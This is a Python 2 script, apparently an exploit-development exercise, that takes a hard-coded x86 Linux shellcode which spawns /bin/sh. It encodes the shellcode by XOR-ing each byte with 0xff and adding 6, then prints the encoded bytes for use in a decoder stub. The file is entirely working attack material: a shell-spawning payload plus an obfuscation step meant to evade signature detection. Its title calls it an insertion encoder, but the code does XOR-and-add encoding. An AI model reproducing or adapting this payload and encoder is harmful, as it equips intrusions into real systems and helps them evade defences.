#!/usr/bin/python
# Python Insertion Encoder 

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""
xor = 0xff

print 'Encoded shellcode ...'

#xor every byte by 0xff first
#add 6 to every byte
for x in bytearray(shellcode) :
	
	#xor X with 0xff
	byte = x ^ xor	
	
	#add 6 to each byte
	encoded += '\\x'
	encoded += '%02x' % (byte + 6)

	encoded2 += '0x'
	encoded2 += '%02x,' % (byte + 6)

print encoded
print encoded2
print 'Len: %d' % len(bytearray(shellcode))
